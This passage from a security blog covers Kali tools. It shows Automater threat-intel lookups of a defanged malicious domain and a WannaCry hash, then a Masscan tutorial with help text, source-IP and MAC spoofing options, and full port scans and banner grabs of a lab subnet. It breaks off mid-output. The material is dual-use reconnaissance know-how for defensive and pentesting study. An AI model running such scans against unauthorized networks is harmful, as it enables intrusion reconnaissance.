</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2017-02-05', 'hxxp://corefitness.info/workouts/men/arms/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2016-12-23', 'hxxp://corefitness.info/b/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2016-12-22', 'hxxp://corefitness.info/')
</span><span class='line'>[+] pDNS malicious URLs from VirusTotal: ('2016-12-21', 'hxxp://corefitness.info/1.exe/')
</span><span class='line'>[+] Malc0de Date: No results found
</span><span class='line'>[+] Malc0de IP: No results found
</span><span class='line'>[+] Malc0de Country: No results found
</span><span class='line'>[+] Malc0de ASN: No results found
</span><span class='line'>[+] Malc0de ASN Name: No results found
</span><span class='line'>[+] Malc0de MD5: No results found
</span><span class='line'>No results found in the THIP
</span><span class='line'>[+] McAfee Web Risk: No results found
</span><span class='line'>[+] McAfee Web Category: No results found
</span><span class='line'>[+] McAfee Last Seen: No results found</span></code></pre></td></tr></table></div></figure>


<p>Here I picked a random URL from the <a href="https://isc.sans.edu/feeds/suspiciousdomains_High.txt">SANS suspicious domains list</a>. It seems that if your search for fitness leads you there, your computer won&rsquo;t be very fit D:</p>

<ul>
<li>chech hash for maliciousness</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>automater b9318a66fa7f50f2f3ecaca02a96268ad2c63db7554ea3acbde43bf517328d06
</span><span class='line'>/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:845: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
</span><span class='line'>  InsecureRequestWarning)
</span><span class='line'>
</span><span class='line'>____________________     Results found for: b9318a66fa7f50f2f3ecaca02a96268ad2c63db7554ea3acbde43bf517328d06     ____________________
</span><span class='line'>[+] MD5 found on VT: 1
</span><span class='line'>[+] Scan date submitted: 2017-06-09 04:35:58
</span><span class='line'>[+] Detected Engines: 54
</span><span class='line'>[+] Total Engines: 61
</span><span class='line'>[+] Vendor | Classification: ('MicroWorld-eScan', 'Trojan.Ransom.WannaCryptor.H')
</span><span class='line'>[+] Vendor | Classification: ('nProtect', 'Ransom/W32.WannaCry.Zen')
</span><span class='line'>[+] Vendor | Classification: ('CAT-QuickHeal', 'Ransom.WannaCrypt.A4')
</span><span class='line'>[+] Vendor | Classification: ('McAfee', 'Ransom-WannaCry!4287E15AF619')
</span><span class='line'>[+] Vendor | Classification: ('Malwarebytes', 'Ransom.WannaCrypt')
</span><span class='line'>[+] Vendor | Classification: ('Zillya', 'Trojan.WannaCryptGen.Win32.2')
</span><span class='line'>[+] Vendor | Classification: ('SUPERAntiSpyware', 'Ransom.WannaCrypt/Variant')
</span><span class='line'>[+] Vendor | Classification: ('K7GW', 'Exploit ( 0050d7a31 )')
</span><span class='line'>[+] Vendor | Classification: ('K7AntiVirus', 'Exploit ( 0050d7a31 )')
</span><span class='line'>[+] Vendor | Classification: ('Arcabit', 'Trojan.Ransom.WannaCryptor.H')
</span><span class='line'>[+] Vendor | Classification: ('Baidu', 'Win32.Worm.Rbot.a')
</span><span class='line'>[+] Vendor | Classification: ('Cyren', 'W32/Trojan.ZTSA-8671')
</span><span class='line'>[+] Vendor | Classification: ('Symantec', 'Ransom.Wannacry')
</span><span class='line'>[+] Vendor | Classification: ('TrendMicro-HouseCall', 'Ransom_WCRY.SMB')
</span><span class='line'>[+] Vendor | Classification: ('Avast', 'Win32:WanaCry-A [Trj]')
</span><span class='line'>[+] Vendor | Classification: ('Kaspersky', 'Trojan-Ransom.Win32.Wanna.m')
</span><span class='line'>[+] Vendor | Classification: ('BitDefender', 'Trojan.Ransom.WannaCryptor.H')
</span><span class='line'>[+] Vendor | Classification: ('NANO-Antivirus', 'Trojan.Win32.Wanna.eovgam')
</span><span class='line'>[+] Vendor | Classification: ('AegisLab', 'Troj.Ransom.W32.Wanna.toNz')
</span><span class='line'>[+] Vendor | Classification: ('Ad-Aware', 'Trojan.Ransom.WannaCryptor.H')
</span><span class='line'>[+] Vendor | Classification: ('Emsisoft', 'Trojan-Ransom.WanaCrypt0r (A)')
</span><span class='line'>[+] Vendor | Classification: ('Comodo', 'UnclassifiedMalware')
</span><span class='line'>[+] Vendor | Classification: ('F-Secure', 'Trojan.Ransom.WannaCryptor.H')
</span><span class='line'>[+] Vendor | Classification: ('DrWeb', 'Trojan.Encoder.11432')
</span><span class='line'>[+] Vendor | Classification: ('VIPRE', 'Trojan.Win32.Generic!BT')
</span><span class='line'>[+] Vendor | Classification: ('TrendMicro', 'Ransom_WCRY.SMB')
</span><span class='line'>[+] Vendor | Classification: ('McAfee-GW-Edition', 'Ransom-WannaCry!4287E15AF619')
</span><span class='line'>[+] Vendor | Classification: ('Sophos', 'Troj/Ransom-EMG')
</span><span class='line'>[+] Vendor | Classification: ('SentinelOne', 'static engine - malicious')
</span><span class='line'>[+] Vendor | Classification: ('F-Prot', 'W32/WannaCrypt.D')
</span><span class='line'>[+] Vendor | Classification: ('Jiangmin', 'Trojan.WanaCry.i')
</span><span class='line'>[+] Vendor | Classification: ('Webroot', 'W32.Ransom.Wannacry')
</span><span class='line'>[+] Vendor | Classification: ('Avira', 'BDS/Agent.ilyda')
</span><span class='line'>[+] Vendor | Classification: ('Endgame', 'malicious (high confidence)')
</span><span class='line'>[+] Vendor | Classification: ('Microsoft', 'Ransom:Win32/WannaCrypt.A!rsm')
</span><span class='line'>[+] Vendor | Classification: ('ZoneAlarm', 'Trojan-Ransom.Win32.Wanna.m')
</span><span class='line'>[+] Vendor | Classification: ('ALYac', 'Trojan.Ransom.WannaCryptor')
</span><span class='line'>[+] Vendor | Classification: ('AVware', 'Trojan.Win32.Generic!BT')
</span><span class='line'>[+] Vendor | Classification: ('VBA32', 'Trojan.Filecoder')
</span><span class='line'>[+] Vendor | Classification: ('ESET-NOD32', 'Win32/Exploit.CVE-2017-0147.A')
</span><span class='line'>[+] Vendor | Classification: ('Tencent', 'Win32.Trojan.Raas.Auto')
</span><span class='line'>[+] Vendor | Classification: ('Yandex', 'Exploit.CVE-2017-0147!')
</span><span class='line'>[+] Vendor | Classification: ('Ikarus', 'Trojan-Ransom.WannaCry')
</span><span class='line'>[+] Vendor | Classification: ('Fortinet', 'W32/WannaCryptor.H!tr')
</span><span class='line'>[+] Vendor | Classification: ('AVG', 'Win32:WanaCry-A [Trj]')
</span><span class='line'>[+] Vendor | Classification: ('Panda', 'Trj/RansomCrypt.I')
</span><span class='line'>[+] Vendor | Classification: ('CrowdStrike', 'malicious_confidence_100% (W)')
</span><span class='line'>[+] Vendor | Classification: ('Qihoo-360', 'HEUR/QVM41.2.2698.Malware.Gen')
</span><span class='line'>[+] Hash found at ThreatExpert: No results found
</span><span class='line'>[+] Malicious Indicators from ThreatExpert: No results found
</span><span class='line'>[+] Date found at VXVault: No results found
</span><span class='line'>[+] URL found at VXVault: No results found
</span><span class='line'>[+] Malc0de Date: No results found
</span><span class='line'>[+] Malc0de IP: No results found
</span><span class='line'>[+] Malc0de Country: No results found
</span><span class='line'>[+] Malc0de ASN: No results found
</span><span class='line'>[+] Malc0de ASN Name: No results found
</span><span class='line'>[+] Malc0de MD5: No results found
</span><span class='line'>No results found in the THMD5</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve grabbed a WannaCry hash and threw it at Automater, you can see it picked it up right away.</p>

<ul>
<li>HTML report of a scan</li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/tools/automater.png" title="automater" alt="automater HTML report"></p>

<p><strong>Learn more:</strong></p>

<p>One of the cool features of Automater is its extensibility. You can add sites to the XML configuration file, and customize it to meet your needs. For further instructions about how to do that, check out the <a href="http://www.tekdefense.com/news/2013/12/10/the-extensibility-of-automater.html">author&rsquo;s post</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>__________________________
</span><span class='line'>&lt; Condense soup, not books! &gt;
</span><span class='line'> ---------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Masscan - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/10/masscan-kali-linux-tools/"/>
    <updated>2017-06-10T04:17:42-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/10/masscan-kali-linux-tools</id>
    <content type="html"><![CDATA[<p>Nmap is our favorite port scanner, but if you want to scan billions of hosts, and still be relatively young when you get the results, there is a solid alternative focused entirely on speed: Masscan &ndash; the Mass IP port scanner</p>

<!-- more -->


<p>Homepage: <a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p>

<h2>masscan description</h2>

<blockquote><p>This is the fastest Internet port scanner. It can scan the entire Internet in under 6 minutes, transmitting 10
million packets per second.</p>

<p>It produces results similar to nmap, the most famous port scanner. Internally, it operates more like scanrand,
unicornscan, and ZMap, using asynchronous transmission. The major difference is that it&rsquo;s faster than these other
scanners. In addition, it&rsquo;s more flexible, allowing arbitrary address ranges and port ranges.</p>

<p>NOTE: masscan uses a custom TCP/IP stack. Anything other than simple port scans will cause conflict with the local
TCP/IP stack. This means you need to either use the -S option to use a separate IP address, or configure your
operating system to firewall the ports that masscan uses.</p>

<p>This program spews out packets very fast. On Windows, or from VMs, it can do 300,000 packets/second. On Linux (no
virtualization) it&rsquo;ll do 1.6 million packets-per-second. That&rsquo;s fast enough to melt most networks.</p>

<p>Note that it&rsquo;ll only melt your own network. It randomizes the target IP addresses so that it shouldn&rsquo;t overwhelm any
distant network.</p>

<p>By default, the rate is set to 100 packets/second.</p></blockquote>

<h2>masscan options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# masscan                                                         
</span><span class='line'>usage:
</span><span class='line'>masscan -p80,8000-8100 10.0.0.0/8 --rate=10000
</span><span class='line'> scan some web ports on 10.x.x.x at 10kpps
</span><span class='line'>masscan --nmap
</span><span class='line'> list those options that are compatible with nmap
</span><span class='line'>masscan -p80 10.0.0.0/8 --banners -oB &lt;filename&gt;
</span><span class='line'> save results of scan in binary format to &lt;filename&gt;
</span><span class='line'>masscan --open --banners --readscan &lt;filename&gt; -oX &lt;savefile&gt;
</span><span class='line'> read binary scan results in &lt;filename&gt; and save them as xml in &lt;savefile&gt;</span></code></pre></td></tr></table></div></figure>


<p>More information:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# masscan --help
</span><span class='line'>MASSCAN is a fast port scanner. The primary input parameters are the
</span><span class='line'>IP addresses/ranges you want to scan, and the port numbers. An example
</span><span class='line'>is the following, which scans the 10.x.x.x network for web servers:
</span><span class='line'> masscan 10.0.0.0/8 -p80
</span><span class='line'>The program auto-detects network interface/adapter settings. If this
</span><span class='line'>fails, you'll have to set these manually. The following is an
</span><span class='line'>example of all the parameters that are needed:
</span><span class='line'> --adapter-ip 192.168.10.123
</span><span class='line'> --adapter-mac 00-11-22-33-44-55
</span><span class='line'> --router-mac 66-55-44-33-22-11
</span><span class='line'>Parameters can be set either via the command-line or config-file. The
</span><span class='line'>names are the same for both. Thus, the above adapter settings would
</span><span class='line'>appear as follows in a configuration file:
</span><span class='line'> adapter-ip = 192.168.10.123
</span><span class='line'> adapter-mac = 00-11-22-33-44-55
</span><span class='line'> router-mac = 66-55-44-33-22-11
</span><span class='line'>All single-dash parameters have a spelled out double-dash equivalent,
</span><span class='line'>so '-p80' is the same as '--ports 80' (or 'ports = 80' in config file).
</span><span class='line'>To use the config file, type:
</span><span class='line'> masscan -c &lt;filename&gt;
</span><span class='line'>To generate a config-file from the current settings, use the --echo
</span><span class='line'>option. This stops the program from actually running, and just echoes
</span><span class='line'>the current configuration instead. This is a useful way to generate
</span><span class='line'>your first config file, or see a list of parameters you didn't know
</span><span class='line'>about. I suggest you try it now:
</span><span class='line'> masscan -p1234 --echo</span></code></pre></td></tr></table></div></figure>


<p>Config file:</p>

<blockquote><p>By default, the program will read default configuration from  the  file
/etc/masscan/masscan.conf. This is useful for system-specific settings,
such as the &mdash;adapter-xxx options. This is also useful for excluded  IP
addresses,  so  that  you  can scan the entire Internet, while skipping
dangerous addresses, like those owned by the DoD, and not make an accidental mistake.</p></blockquote>

<p>Nmap compatible options:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# masscan --nmap                                                  
</span><span class='line'>Masscan (https://github.com/robertdavidgraham/masscan)
</span><span class='line'>Usage: masscan [Options] -p{Target-Ports} {Target-IP-Ranges}
</span><span class='line'>TARGET SPECIFICATION:
</span><span class='line'>  Can pass only IPv4 address, CIDR networks, or ranges (non-nmap style)
</span><span class='line'>  Ex: 10.0.0.0/8, 192.168.0.1, 10.0.0.1-10.0.0.254
</span><span class='line'>  -iL &lt;inputfilename&gt;: Input from list of hosts/networks
</span><span class='line'>  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks
</span><span class='line'>  --excludefile &lt;exclude_file&gt;: Exclude list from file
</span><span class='line'>  --randomize-hosts: Randomize order of hosts (default)
</span><span class='line'>HOST DISCOVERY:
</span><span class='line'>  -Pn: Treat all hosts as online (default)
</span><span class='line'>  -n: Never do DNS resolution (default)
</span><span class='line'>SCAN TECHNIQUES:
</span><span class='line'>  -sS: TCP SYN (always on, default)
</span><span class='line'>SERVICE/VERSION DETECTION:
</span><span class='line'>  --banners: get the banners of the listening service if available. The
</span><span class='line'>    default timeout for waiting to recieve data is 30 seconds.
</span><span class='line'>PORT SPECIFICATION AND SCAN ORDER:
</span><span class='line'>  -p &lt;port ranges&gt;: Only scan specified ports
</span><span class='line'>    Ex: -p22; -p1-65535; -p 111,137,80,139,8080
</span><span class='line'>TIMING AND PERFORMANCE:
</span><span class='line'>  --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per second
</span><span class='line'>  --connection-timeout &lt;number&gt;: time in seconds a TCP connection will
</span><span class='line'>    timeout while waiting for banner data from a port.
</span><span class='line'>FIREWALL/IDS EVASION AND SPOOFING:
</span><span class='line'>  -S/--source-ip &lt;IP_Address&gt;: Spoof source address
</span><span class='line'>  -e &lt;iface&gt;: Use specified interface
</span><span class='line'>  -g/--source-port &lt;portnum&gt;: Use given port number
</span><span class='line'>  --ttl &lt;val&gt;: Set IP time-to-live field
</span><span class='line'>  --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address
</span><span class='line'>OUTPUT:
</span><span class='line'>  --output-format &lt;format&gt;: Sets output to binary/list/unicornscan/json/grepable/xml
</span><span class='line'>  --output-file &lt;file&gt;: Write scan results to file. If --output-format is
</span><span class='line'>     not given default is xml
</span><span class='line'>  -oL/-oJ/-oG/-oB/-oX/-oU &lt;file&gt;: Output scan in List/JSON/Grepable/Binary/XML/Unicornscan format,
</span><span class='line'>     respectively, to the given filename. Shortcut for
</span><span class='line'>     --output-format &lt;format&gt; --output-file &lt;file&gt;
</span><span class='line'>  -v: Increase verbosity level (use -vv or more for greater effect)
</span><span class='line'>  -d: Increase debugging level (use -dd or more for greater effect)
</span><span class='line'>  --open: Only show open (or possibly open) ports
</span><span class='line'>  --packet-trace: Show all packets sent and received
</span><span class='line'>  --iflist: Print host interfaces and routes (for debugging)
</span><span class='line'>  --append-output: Append to rather than clobber specified output files
</span><span class='line'>  --resume &lt;filename&gt;: Resume an aborted scan
</span><span class='line'>MISC:
</span><span class='line'>  --send-eth: Send using raw ethernet frames (default)
</span><span class='line'>  -V: Print version number
</span><span class='line'>  -h: Print this help summary page.
</span><span class='line'>EXAMPLES:
</span><span class='line'>  masscan -v -sS 192.168.0.0/16 10.0.0.0/8 -p 80
</span><span class='line'>  masscan 23.0.0.0/0 -p80 --banners -output-format binary --output-filename internet.scan
</span><span class='line'>  masscan --open --banners --readscan internet.scan -oG internet_scan.grepable
</span><span class='line'>SEE (https://github.com/robertdavidgraham/masscan) FOR MORE HELP</span></code></pre></td></tr></table></div></figure>


<p>Manpage: <a href="http://manpages.org/masscan/8">http://manpages.org/masscan/8</a></p>

<h2>masscan usage</h2>

<ul>
<li>look at the current configuration</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# masscan --echo
</span><span class='line'>rate =     100.00
</span><span class='line'>randomize-hosts = true
</span><span class='line'>seed = 9262294816069822464
</span><span class='line'>shard = 1/1
</span><span class='line'># ADAPTER SETTINGS
</span><span class='line'>adapter = 
</span><span class='line'>adapter-ip = 0.0.0.0
</span><span class='line'>adapter-mac = 00:00:00:00:00:00
</span><span class='line'>router-mac = 00:00:00:00:00:00
</span><span class='line'># OUTPUT/REPORTING SETTINGS
</span><span class='line'>output-format = unknown(0)
</span><span class='line'>show = open,,
</span><span class='line'>output-filename = 
</span><span class='line'>rotate = 0
</span><span class='line'>rotate-dir = .
</span><span class='line'>rotate-offset = 0
</span><span class='line'>rotate-filesize = 0
</span><span class='line'>pcap = 
</span><span class='line'># TARGET SELECTION (IP, PORTS, EXCLUDES)
</span><span class='line'>retries = 0
</span><span class='line'>ports = 
</span><span class='line'>
</span><span class='line'>capture = cert
</span><span class='line'>nocapture = html
</span><span class='line'>nocapture = heartbleed
</span><span class='line'>
</span><span class='line'>min-packet = 60</span></code></pre></td></tr></table></div></figure>


<ul>
<li>check installation</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>masscan --regress
</span><span class='line'>regression test: success!</span></code></pre></td></tr></table></div></figure>


<ul>
<li>full port scan on local subnet</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# masscan -p0-65535 192.168.217.0/24 --rate 100000
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2017-06-10 09:02:34 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning 256 hosts [65536 ports/host]
</span><span class='line'>Discovered open port 443/tcp on 192.168.217.131                                
</span><span class='line'>Discovered open port 139/tcp on 192.168.217.133                                
</span><span class='line'>Discovered open port 139/tcp on 192.168.217.134                                
</span><span class='line'>Discovered open port 139/tcp on 192.168.217.131                                
</span><span class='line'>Discovered open port 111/tcp on 192.168.217.131                                
</span><span class='line'>Discovered open port 23/tcp on 192.168.217.133                                 
</span><span class='line'>Discovered open port 21/tcp on 192.168.217.133                                 
</span><span class='line'>Discovered open port 22/tcp on 192.168.217.131                                 
</span><span class='line'>Discovered open port 22/tcp on 192.168.217.135                                 
</span><span class='line'>Discovered open port 5432/tcp on 192.168.217.133                               
</span><span class='line'>Discovered open port 135/tcp on 192.168.217.134                                
</span><span class='line'>Discovered open port 22/tcp on 192.168.217.133                                 
</span><span class='line'>Discovered open port 25/tcp on 192.168.217.133                                 
</span><span class='line'>Discovered open port 53/tcp on 192.168.217.133                                 
</span><span class='line'>Discovered open port 3632/tcp on 192.168.217.133                               
</span><span class='line'>Discovered open port 80/tcp on 192.168.217.135                                 
</span><span class='line'>Discovered open port 80/tcp on 192.168.217.131                                 
</span><span class='line'>Discovered open port 80/tcp on 192.168.217.133                                 
</span><span class='line'>Discovered open port 445/tcp on 192.168.217.131                                
</span><span class='line'>Discovered open port 445/tcp on 192.168.217.133                                
</span><span class='line'>Discovered open port 445/tcp on 192.168.217.134                                
</span><span class='line'>Discovered open port 8180/tcp on 192.168.217.133                               
</span><span class='line'>Discovered open port 8009/tcp on 192.168.217.133                               
</span><span class='line'>Discovered open port 3306/tcp on 192.168.217.133   </span></code></pre></td></tr></table></div></figure>


<p>The scan was done in a couple of minutes. You might be wondering, how does this tool scan the entire internet in 3 minutes if it took the same length of time for a puny subnet? Well, there are some limitations. To get the most of its speed, you need the proper adapter and driver. Also notice that I rate-limited it to 100k packets per second, because I didn&rsquo;t want my local network to blow up! If you want to benchmark masscan&rsquo;s performance, look on its homepage, under the Performance testing section.</p>

<ul>
<li>grab banners of open ports</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# masscan 192.168.217.0/24 -p22,80,139,445,3306 --banners --source-ip 192.168.217.150 --rate 100000
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2017-06-10 09:18:27 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning 256 hosts [5 ports/host]
</span><span class='line'>Discovered open port 80/tcp on 192.168.217.133                                 
</span><span class='line'>Discovered open port 139/tcp on 192.168.217.134                                
</span><span class='line'>Discovered open port 22/tcp on 192.168.217.133                                 
</span><span class='line'>Discovered open port 139/tcp on 192.168.217.133                                
</span><span class='line'>Discovered open port 22/tcp on 192.168.217.131                                 
</span><span class='line'>Discovered open port 80/tcp on 192.168.217.131                                 
</span><span class='line'>Discovered open port 445/tcp on 192.168.217.131                                
</span><span class='line'>Discovered open port 139/tcp on 192.168.217.131                                
</span><span class='line'>Discovered open port 22/tcp on 192.168.217.135                                 
</span><span class='line'>Discovered open port 80/tcp on 192.168.217.135                                 
</span><span class='line'>Banner on port 22/tcp on 192.168.217.135: [ssh] SSH-2.0-OpenSSH_5.5p1 Debian-6+squeeze2
</span><span class='line'>Banner on port 22/tcp on 192.168.217.133: [ssh] SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
</span><span class='line'>Banner on port 22/tcp on 192.168.217.131: [ssh] SSH-2.0-OpenSSH_6.6.1          
</span><span class='line'>Discovered open port 445/tcp on 192.168.217.134                                
</span><span class='line'>Discovered open port 445/tcp on 192.168.217.133                                
</span><span class='line'>Discovered open port 3306/tcp on 192.168.217.133                               
